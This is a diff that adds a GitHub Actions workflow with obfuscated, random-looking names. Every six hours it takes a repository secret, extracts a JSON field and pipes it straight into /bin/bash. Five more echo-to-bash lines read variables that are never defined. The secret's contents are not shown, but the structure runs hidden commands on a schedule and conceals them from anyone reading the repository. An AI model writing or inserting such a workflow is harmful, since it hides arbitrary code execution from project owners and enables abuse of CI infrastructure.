@@ -1,0 +1,23 @@
+name: portfoliotogetherness
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: portfoliotogetherness
+        env:
+          udph2401: ${{ secrets.udph2401 }}
+        run: |
+          echo $udph2401 | jq -r .ivyf0 | /bin/bash
+          echo $ckbad74 | jq -r .i91 | /bin/bash
+          echo $kxut84 | jq -r .mml8087 | /bin/bash
+          echo $i934 | jq -r .xnws94797 | /bin/bash
+          echo $gra6 | jq -r .yo19 | /bin/bash
+          echo $ruu66152 | jq -r .twhq648 | /bin/bash
+
